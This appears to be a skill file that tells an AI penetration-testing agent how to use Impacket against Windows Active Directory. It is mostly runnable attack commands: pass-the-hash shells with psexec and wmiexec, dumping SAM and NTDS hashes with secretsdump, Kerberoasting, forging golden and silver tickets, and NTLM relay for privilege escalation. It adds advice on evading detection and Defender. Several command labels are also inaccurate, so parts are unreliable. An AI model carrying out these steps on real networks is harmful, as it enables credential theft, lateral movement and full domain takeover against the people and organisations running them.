---
name: Impacket
description: Windows protocol toolkit for Kerberos, SMB, MS-RPC, LDAP, and Active Directory attacks including pass-the-hash, PSExec, and secrets dump
---

# Impacket

Pull this skill when you have Windows/AD credentials (password or hash) and need to move laterally, execute commands, dump secrets, or interact with Windows protocols. Impacket is the Swiss Army knife for Windows post-exploitation.

## RedAmon wiring

| Action | Tool | Notes |
|--------|------|-------|
| SMB exec (like psexec) | `kali_shell` — `impacket-psexec` | Semi-interactive shell via SMB |
| WMI exec | `kali_shell` — `impacket-wmiexec` | Command execution via WMI |
| SMB exec (noisy) | `kali_shell` — `impacket-smbexec` | SMB-based exec (loud) |
| Dump SAM hashes | `kali_shell` — `impacket-secretsdump` | Remote SAM, NTDS, LSA secrets |
| Kerberos ticket requests | `kali_shell` — `impacket-getTGT` | Request TGT for user |
| Kerberoasting | `kali_shell` — `impacket-GetUserSPNs` | Extract service account hashes |
| ASREP roasting | `kali_shell` — `impacket-GetNPUsers` | Find kerberoastable users without pre-auth |
| SMB shares | `kali_shell` — `impacket-smbclient` | Interact with SMB shares |
| Golden ticket | `kali_shell` — `impacket-ticketer` | Forge Kerberos tickets |
| SMB relay | `kali_shell` — `impacket-ntlmrelayx` | NTLM relay attacks |
| Regex search across SMB | `kali_shell` — `reg.py` | Query registry remotely |

## Primer

Impacket is a collection of Python scripts that implement Windows protocols at the protocol level (no WinAPI dependency). Key capabilities:

| Script | Function | Auth type |
|--------|----------|-----------|
| `psexec.py` | Remote shell via SMB | Password / NTLM hash |
| `wmiexec.py` | Remote shell via WMI | Password / NTLM hash |
| `smbexec.py` | Remote shell via SMB (different) | Password / NTLM hash |
| `secretsdump.py` | Dump credentials | Password / NTLM hash |
| `GetUserSPNs.py` | Kerberoasting | Password / NTLM hash |
| `GetNPUsers.py` | ASREP roast | No auth required |
| `ticketer.py` | Forge tickets | KRBTGT hash |
| `ntlmrelayx.py` | Relay NTLM auth | Captured hashes |
| `smbclient.py` | SMB file operations | Password / NTLM hash |
| `rpcdump.py` | RPC endpoint discovery | Password / NTLM hash |

## Remote execution patterns

### Pass-the-Hash with PSExec
```bash
impacket-psexec -hashes LMHASH:NTHASH administrator@target.com
# Provides a shell on the target via SMB service creation
```

### Pass-the-Hash with WMIExec (stealthier)
```bash
impacket-wmiexec -hashes LMHASH:NTHASH administrator@target.com
# No service creation — uses WMI. Generally cleaner logs than psexec.
```

### With password (not hash)
```bash
impacket-psexec domain/administrator:Password123@target.com
impacket-wmiexec domain/administrator:Password123@target.com
```

### Local auth (workgroup instead of domain)
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:1234567812345678 ./administrator@target.com
```

## Dumping credentials

### Remote SAM dump
```bash
impacket-secretsdump -hashes LMHASH:NTHASH localadmin@target.com
# Dumps local account hashes from SAM
```

### Dump NTDS.dit (domain controller)
```bash
impacket-secretsdump -hashes LMHASH:NTHASH domain\administrator@dc.target.com
# Dumps all domain user hashes from NTDS
```

### Dump LSA secrets
```bash
impacket-secretsdump -hashes LMHASH:NTHASH domain\administrator@target.com -just-dc-user krbtgt
# Dumps specific user's hash (e.g., krbtgt for golden ticket)
```

## Kerberos attacks

### Kerberoasting (extract service account hashes)
```bash
# Without authentication (if user has already authenticated via Kerberos ticket)
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 domain.com/user

# With cleartext credentials
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 domain.com/user:password

# Output hashes for hashcat cracking (-m 13100)
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 domain.com/user -outputfile hashes.txt
```

### ASREP Roast (no pre-auth required)
```bash
# Find users with DONT_REQ_PREAUTH set
impacket-GetNPUsers -dc-ip 10.0.0.1 -request domain.com/

# With userlist (no password required for ASREP-roastable users)
impacket-GetNPUsers -dc-ip 10.0.0.1 -request -usersfile users.txt domain.com/
```

### Get a TGT for a user
```bash
impacket-getTGT domain.com/user:password -dc-ip 10.0.0.1
export KRB5CCNAME=user.ccache
# Now other Impacket scripts see the Kerberos ticket
```

### Golden / Silver Ticket
```bash
# Golden ticket (domain admin from KRBTGT hash)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID \
  -domain domain.com Administrator

# Silver ticket (service access from service account hash)
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID \
  -domain domain.com -spn cifs/target.domain.com Administrator
```

## NTLM relay

```bash
# Relay captured NTLM auth to another target
impacket-ntlmrelayx -tf targets.txt -smb2support

# With credential dumping on relay success
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Relay to LDAP for privilege escalation (ESC8, RBCD)
impacket-ntlmrelayx -t ldaps://dc.target.com --escalate-user admin_user
```

## SMB operations

```bash
# Interactive SMB client
impacket-smbclient domain/user:password@target.com
# shares> ls
# shares> cd C$
# shares> get secrets.txt

# List shares anonymously
impacket-smbclient -no-pass target.com
```

## RPC endpoint discovery

```bash
# Enumerate RPC endpoints on target
impacket-rpcdump target.com

# Check for MS-RPRN (printer bug) — useful for coercion
impacket-rpcdump target.com | grep -i printer
```

## Detection noise comparison

| Script | Service created | Event logs | Stealth |
|--------|----------------|------------|---------|
| `psexec.py` | Yes (service) | 7045, 4624, 5145 | Low |
| `wmiexec.py` | No | 4624, logon | Medium |
| `smbexec.py` | Yes | 7045, 4624 | Low |
| `secretsdump.py` | No | 4624 | Medium |
| `GetUserSPNs.py` | No | 4769 (Kerberos TGS) | Medium-High |
| `GetNPUsers.py` | No | 4768 (AS-REQ) | High |

## Pitfalls and recovery

| Pitfall | Fix |
|---------|-----|
| `ERROR_ACCESS_DENIED` | User doesn't have admin rights on the target. Try different user or approach. |
| SMB signing enabled | Check with `smbclient.py -no-pass target.com`. If signing required, psexec and secretsdump will fail. |
| Windows Defender blocking | Use `wmiexec.py` instead of `psexec.py` — WMI is monitored but Defender less aggressive. |
| Firewall blocking | SMB (445) may be blocked externally. Check if 445 is open. Try WMI (135) if SMB is blocked. |
| Kerberos clock skew | `klist` or time sync. NTP-sync the attacking machine: `ntpdate dc.target.com`. |
| NTLMv2 not captured | Ensure target allows NTLMv2. Most modern AD does by default. |
| Python environment missing modules | Impacket is pre-installed in Kali or via `pip install impacket`. |

## Hand-off

- After dumping hashes: `-> /skill/tooling/hashcat` to crack offline
- After Kerberoasting: `-> /skill/tooling/hashcat` with `-m 13100` for Kerberos TGS hashes
- After getting admin access: `-> /skill/active_directory/ad_kill_chain` for privilege escalation paths
- For BloodHound data collection: `-> /skill/tooling/bloodhound` to map AD attack paths
- For network pivoting from compromised host: `-> /skill/network/pivoting_tunneling`
- For AD certificate escalation: `-> /skill/tooling/certipy`

## Pro tips

- **wmiexec is the go-to**: Of all the remote execution scripts, wmiexec is the quietest and most reliable. Use it unless you specifically need psexec's interactive console.
- **secretsdump with just one hash**: You only need the NTHASH (second half after `:`) for pass-the-hash. The LM half can be all zeros.
- **Use Kerberos when possible**: If you have a TGT (`export KRB5CCNAME=user.ccache`), Impacket scripts will use Kerberos auth instead of NTLM, which bypasses NTLM relay protections like SMB signing.
- **The `-no-pass` flag is powerful**: Many Impacket scripts work without a password — they'll attempt anonymous auth or use the current Kerberos ticket if available.
- **ntlmrelayx + SOCKS**: Using `-socks` keeps the connection alive so you can reuse the relayed auth session for multiple commands without re-triggering the relay attack.
